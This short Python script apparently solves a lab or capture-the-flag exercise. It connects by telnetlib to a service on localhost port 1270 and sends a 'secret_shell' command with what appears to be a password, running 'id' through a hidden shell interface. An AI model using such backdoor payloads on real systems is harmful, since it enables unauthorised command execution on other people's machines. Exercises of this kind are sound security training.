#!/usr/bin/env python3

# Really nice library for simple network communication in python (despite "telnet" in the name)
import telnetlib

# Host information
HOST = 'localhost'
PORT = 1270

# Connect to the target
tn = telnetlib.Telnet(HOST, PORT)

# Read until the end of the prompt
tn.read_until(b'> ')

# Send the payload
tn.write(b'secret_shell mikejones id' + b'\n')

# Write out the response
print(tn.read_until(b'> ').decode('ascii'))